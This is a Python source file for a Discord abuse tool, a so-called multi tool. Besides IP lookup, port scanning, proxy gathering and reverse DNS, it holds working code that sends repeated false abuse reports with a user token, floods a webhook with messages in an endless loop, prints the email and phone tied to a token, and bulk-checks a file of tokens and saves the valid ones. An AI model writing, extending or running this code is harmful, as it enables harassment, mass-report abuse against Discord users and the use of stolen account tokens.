import sys
import ctypes
import requests
import time
import threading
import socket
import concurrent.futures
from os import system, name
from random import randint
from colorama import Fore
cummands = ['1','2','3','4','5','6','7','8','clear','cls','logout','exit','quit']

def shitass_clear():
	if name == 'nt':
		_ = system('cls')
	else:
		_ = system('clear')

def shitass_exit():
	sys.exit("   ╠═[X] EXITING > GOODBYE.")

def shitass_toucan(TOKEN):
	headers = {
		'Authorization': f'{TOKEN}'
	}
	poopies = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
	try:
		if poopies.status_code == 200:
			fortnite = 0
		else:
			fortnite = 1
	except Exception:
		fortnite = 2
	return fortnite

def shitass_main():
	global newprompt
	newprompt = True
	ctypes.windll.kernel32.SetConsoleTitleW(
		f'Shitass Multi Tool | By bong#5107')
	print('')
	print('')
	shitass_clear()
	print(f'''\n


				███████╗██╗  ██╗██╗████████╗ █████╗ ███████╗███████╗
				██╔════╝██║  ██║██║╚══██╔══╝██╔══██╗██╔════╝██╔════╝
				███████╗███████║██║   ██║   ███████║███████╗███████╗
				╚════██║██╔══██║██║   ██║   ██╔══██║╚════██║╚════██║
				███████║██║  ██║██║   ██║   ██║  ██║███████║███████║
				╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
																													                                               
		═════════════════════════════════════════════════════════════════════════════════════
		 [{Fore.CYAN}1{Fore.RESET}] IP/DOMAIN CHECKER | [{Fore.MAGENTA}2{Fore.RESET}] PORT SCANNER | [{Fore.CYAN}3{Fore.RESET}] PROXY GEN  | [{Fore.MAGENTA}4{Fore.RESET}] REVESE DNS  |
		 [{Fore.CYAN}5{Fore.RESET}] DISCORD REPORTER  | [{Fore.MAGENTA}6{Fore.RESET}] WEBHOOK SPAM | [{Fore.CYAN}7{Fore.RESET}] TOKEN INFO | [{Fore.MAGENTA}8{Fore.RESET}] TOKEN CHECK |
		═════════════════════════════════════════════════════════════════════════════════════''')




def ip(ipaddress):
	shitass_main()
	URL = f'http://ip-api.com/json/{ipaddress}?fields=query,status,continent,country,regionName,city,district,zip,lat,lon,isp,org,as,reverse,mobile,proxy,hosting'

	req = requests.get(url = URL)
	data = req.json()
	status = data['status']
	if(status == 'fail'):
		input('   [❌] REQUEST FAILED')
	else:
		query = data['query']
		continent = data['continent']
		country = data['country']
		region = data['regionName']
		city = data['city']
		zipp = data['zip']
		lat = data['lat']
		lon = data['lon']
		isp = data['isp']
		org = data['org']
		asn = data['as']
		mobile = data['mobile']
		proxy = data['proxy']
		hosting = data['hosting']

		print(f'''
		[{Fore.MAGENTA}IP:{Fore.RESET}]                     {query}
		[{Fore.MAGENTA}CONTINENT:{Fore.RESET}]              {continent}
		[{Fore.MAGENTA}COUNTRY:{Fore.RESET}]		  {country}
		[{Fore.MAGENTA}REGION:{Fore.RESET}]		  {region}
		[{Fore.MAGENTA}CITY:{Fore.RESET}]			  {city}
		[{Fore.MAGENTA}ZIP:{Fore.RESET}]			  {zipp}
		[{Fore.MAGENTA}LATITUDE:{Fore.RESET}]		  {lat}
		[{Fore.MAGENTA}LONGITUDE:{Fore.RESET}]		  {lon}
		[{Fore.MAGENTA}ISP:{Fore.RESET}]		          {isp}
		[{Fore.MAGENTA}ORGINIZATION:{Fore.RESET}]	          {org}
		[{Fore.MAGENTA}AS:{Fore.RESET}]		          {asn}
		[{Fore.MAGENTA}MOBILE?:{Fore.RESET}]		  {mobile}
		[{Fore.MAGENTA}PROXY?:{Fore.RESET}]		  {proxy}
		[{Fore.MAGENTA}HOSTING?:{Fore.RESET}]		  {hosting}


		''')


def pscan(ipaddress, port, threads):
	shitass_main()
	print_lock = threading.Lock()

	def scan(ipaddress, port):
		scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		scanner.settimeout(1)
		try:
			scanner.connect((ipaddress, port))
			scanner.close()
			with print_lock:
				print()
				print(f'   [{Fore.WHITE}{port}{Fore.RESET}]' + f'{Fore.GREEN}OPEN{Fore.RESET}')
		except:
			pass

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
		for port in range(int(port)):
			executor.submit(scan, ipaddress, port + 1)


def proxygen(protocol):
	shitass_main()

	if protocol == 1:
		url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
	elif protocol == 2:
		url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all'
	elif protocol == 3:
		url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
	elif protocol == 4:
		url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all'
	else:
		print(f'   [❗] {Fore.RED}INVALID PROTOCOL{Fore.RESET}')
		return


	req = requests.get(url)
	data = req.text
	if req.status_code == 200:
		balls = randint(1,999)
		name = f'{protocol.upper()}_PROXIES{balls}'
		with open(f'{name}.txt', 'w') as saveFile:
			saveFile.write(data)

		with open(f'{name}.txt') as poop:
			lines = poop.readlines()

		with open(f'{name}.txt', 'r+') as poop:
			lines = filter(lambda x: x.strip(), lines)
			poop.writelines(lines)

		print(f'  [✔️] SAVED PROXIES TO {name}')
	else:
		print('   [❌]REQUEST FAILED')


def reversedns(ipaddy):
	shitass_main()
	try:
		domain = socket.gethostbyaddr(ipaddy)[0]
		print(f'   [✔️] DOMAIN FOUND: {domain}')
	except:
		print('   [❌] REVERSE DNS FAILED')


def discreporter():
	shitass_main()
	penis = True
	print(f'   [❗] {Fore.RED}WARNING{Fore.RESET}{Fore.WHITE} DO NOT USE YOUR MAIN DISCORD TOKEN FOR THIS YOU WILL PROBABLY GET {Fore.RESET}{Fore.RED}BANNED{Fore.RESET}')
	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER DISCORD TOKEN', end=''); TOKEN = input('  :  ')


	fortnite = shitass_toucan(TOKEN)
	if fortnite == 0:
		shitass_main()
		print('   [✔️] VALID TOKEN PROVIDED')
	elif fortnite == 1:
		print('   [❌] INALID TOKEN PROVIDED')
		return
	else:
		print('   [❌] UNABLE TO CHECK TOKEN')
		return

	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER SERVER ID', end=''); fart_serverid = input('  :  ')
	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER CHANNEL ID', end=''); fart_channelid = input('  :  ')
	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER MESSAGE ID', end=''); fart_messageid = input('  :  ')
	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER DELAY IN SECONDS', end=''); fart_delay = input('  :  ')

	shitass_main()
	print(f'   ╔════════════[{Fore.MAGENTA}<>{Fore.RESET}]\n   ╚═══>{Fore.CYAN}Shitass{Fore.RESET}@bignuts {Fore.MAGENTA}-{Fore.RESET} ')

	print(f'   [{Fore.MAGENTA}>{Fore.RESET}] CHOOSE REPORT REASON\n   [{Fore.MAGENTA}>{Fore.RESET}] 0 - ILLEGAL CONTENT\n   [{Fore.MAGENTA}>{Fore.RESET}] 1 - HARASSMENT\n   [{Fore.MAGENTA}>{Fore.RESET}] 2 - SPAM OR PHISHING LINKS\n   [{Fore.MAGENTA}>{Fore.RESET}] 3 - SELF-HARM\n   [{Fore.MAGENTA}>{Fore.RESET}] 4 - NSFW CONTENT\n', end=''); fart_reason = input(f'CHOICE [{Fore.MAGENTA}>{Fore.RESET}]:')


	while penis == True:
		try:
			shitass_main()
			queef = requests.post(
				'https://discordapp.com/api/v9/report', json={
					'channel_id': fart_channelid,
					'message_id': fart_messageid,
					'guild_id': fart_serverid,
					'reason': fart_reason
				}, headers={
					'Accept': '*/*',
                	'Accept-Encoding': 'gzip, deflate',
                	'Accept-Language': 'sv-SE',
                	'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                	'Content-Type': 'application/json',
                	'Authorization': TOKEN
				}
			)
			if (status := queef.status_code) == 201:
				print('   [✔️] REPORT SENT')
			elif status == 401:
				print('   [❌] ERROR 401 UNAUTHORIZED')
			else:
				print('   [❌] REPORT NOT SENT')
		except Exception as e:
			print(e)

		time.sleep(int(fart_delay))


def webhookfuck(link, name, message, amount):
	shitass_main()
	sex = True
	shitter = 0

	while sex == True if amount == "inf" else shitter < int(amount):
		try:
			req = requests.post(
				link,
				json={
					"content": str(message),
					"username": str(name),
					"avatar_url": "https://i.kym-cdn.com/entries/icons/original/000/018/166/pakalu.png" # change this shit if u want
				}
			)
			if req.status_code == 204:
				print('   [✔️] SENT MESSAGE')
			else:
				print('   [❌] FAILED TO SEND MESSAGE')
		except:
			sex = False
			print(f'   {Fore.RED}STOPPED{Fore.RESET}')
		shitter += 1


def tokenInfo(token):
	shitass_main()
	headers = {'Authorization': token, 'Content-Type': 'application/json'}
	req = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
	if req.status_code == 200:
			userName = req.json()['username'] + '#' + req.json()['discriminator']
			userID = req.json()['id']
			phone = req.json()['phone']
			email = req.json()['email']
			mfa = req.json()['mfa_enabled']
			if(mfa == 'false'):
				mf = 'Disabled'
			else:
				mf = 'Enabled'
			print(f'''
			[{Fore.MAGENTA}USERNAME:{Fore.RESET}]        {userName}
			[{Fore.MAGENTA}USERID:{Fore.RESET}]          {userID}
			[{Fore.MAGENTA}2FA:{Fore.RESET}]             {mf}
			[{Fore.MAGENTA}EMAIL:{Fore.RESET}]           {email}
			[{Fore.MAGENTA}PHONE NUMBER:{Fore.RESET}]    {phone}
			[{Fore.MAGENTA}TOKEN:{Fore.RESET}]           {token}

			''')
	else:
		print('[❌] PROVIDED TOKEN IS INVALID')


def tokencheck():
	shitass_main()
	input(f"   [❗] PROGRAM WILL {Fore.RED}BREAK{Fore.RESET} WITHOUT A {Fore.GREEN}TOKENS.TXT{Fore.RESET}")
	checked = []
	with open('tokens.txt', 'r') as f:
		for line in f:
			time.sleep(0)
			token = line.rstrip("\n")
			headers = {
				'Authorization': f'{token}'
			}
			src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
			try:
				if src.status_code == 200:
					print("[✔️] VALID TOKEN > " + token)
					checked.append(token)
				else:
					print("[❌] INVALID TOKEN > " + token)
			except Exception:
				print (f"[{Fore.RED}X{Fore.RESET}] TOKEN CHECK FAILED")
	if len(checked) > 0:
		save = input(f'{Fore.GREEN}{len(checked)} VALID TOKENS{Fore.RESET}\nSAVE TOKENS TO FILE? (Y/N)')
		if save == 'y':
			balls = randint(1,999)
			name = f'VALID_TOKENS{balls}'
			with open(f'{name}.txt', 'w') as saveFile:
				saveFile.write('\n'.join(checked))
			print(f'SAVED TOKENS TO {name}')


def cmds():
	global newprompt
	if newprompt:
		newprompt = False
		command = input(
			f"   ╔════════════[{Fore.MAGENTA}<>{Fore.RESET}]\n   ╚═══>{Fore.CYAN}Shitass{Fore.RESET}@bignuts {Fore.MAGENTA}-{Fore.RESET} ")
	else:
		command = input(
			f"   ╠════════════[{Fore.MAGENTA}<>{Fore.RESET}]\n   ╚═══>{Fore.CYAN}Shitass{Fore.RESET}@bignuts {Fore.MAGENTA}-{Fore.RESET} ")
	if command not in cummands:
		print(
			f"   ╠═[{Fore.MAGENTA}X{Fore.RESET}] {Fore.RED}Invalid{Fore.RESET} Option")
		cmds()
	if command == "1":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input(':  ')
		ip(ipaddress)
	elif command == "2":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input(':  ')
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER PORT RANGE EX: 1000', end=''); port = input(':  ')
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER THREAD COUNT', end=''); threads = input(':  ')
		pscan(ipaddress, port, threads)
	elif command == "3":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] CHOOSE PROXY PROTOCOL\n   [{Fore.MAGENTA}>{Fore.RESET}] 1 - HTTPS\n   [{Fore.MAGENTA}>{Fore.RESET}] 2 - SOCKS4\n   [{Fore.MAGENTA}>{Fore.RESET}] 3 - SOCKS5\n   [{Fore.MAGENTA}>{Fore.RESET}] 4 - ALL\n', end=''); protocol = input(f'CHOICE [{Fore.MAGENTA}>{Fore.RESET}]:')
		proxygen(protocol)
	elif command == "4":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER IP', end=''); ipaddy = input(':  ')
		reversedns(ipaddy)
	elif command == "5":
		discreporter()
	elif command == "6":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER WEBHOOK LINK', end=''); link = input(':  ')
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER CUSTOM WEBHOOK NAME', end=''); name = input(':  ')
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER MESSAGE', end=''); message = input(':  ')
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER NUMBER OF MESSAGES PUT "inf" FOR INFINITE', end=''); amount = input(':  ')
		webhookfuck(link, name, message, amount)
	elif command == "7":
		print(f'   [{Fore.MAGENTA}>{Fore.RESET}] ENTER ACCOUNT TOKEN', end=''); token = input(':  ')
		tokenInfo(token)
	elif command == "8":
		tokencheck()
	elif command == "clear":
		shitass_main()
	elif command == "cls":
		shitass_main()
	elif command == "exit":
		shitass_exit()
	elif command == "quit":
		shitass_exit()
	elif command == "logout":
		shitass_exit()


shitass_main()
while True:
	try:
		cmds()
	except KeyboardInterrupt:
		pass
		print('')
